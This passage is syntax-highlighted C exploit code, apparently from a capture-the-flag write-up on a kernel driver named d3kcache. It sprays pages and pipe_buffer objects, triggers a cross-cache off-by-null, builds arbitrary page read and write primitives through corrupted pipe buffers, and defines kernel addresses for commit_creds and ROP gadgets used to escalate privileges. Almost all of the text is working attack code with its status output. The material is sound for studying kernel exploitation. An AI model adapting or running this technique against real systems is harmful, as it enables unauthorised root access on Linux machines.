&#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(struct pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_page</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base;</span><br><span class="line"><span class="keyword">uint64_t</span> vmemmap_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] faild open d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">        write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line">    <span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_4pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span> + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, <span class="number">0</span> + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            create(i, <span class="number">8</span>, <span class="string">&quot;0x196082&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[(PIPE_SPRAY_NUM / <span class="number">2</span>) + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, (PIPE_SPRAY_NUM / <span class="number">2</span>) + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x61</span>, <span class="number">0x800</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(i, <span class="number">0x7f8</span>, buf);</span><br><span class="line">        &#125;</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> str_flag[<span class="number">0x10</span>];</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(str_flag, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(str_flag));</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], str_flag, <span class="number">8</span>);</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str_flag, <span class="string">&quot;0x196082&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">            &#123;</span><br><span class="line">                orig_pid = nr;</span><br><span class="line">                victim_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>,</span><br><span class="line">                       victim_pid, orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">               info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="keyword">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">        info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">            <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">            &#123;</span><br><span class="line">                snd_orig_pid = nr;</span><br><span class="line">                snd_vicitm_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">                <span 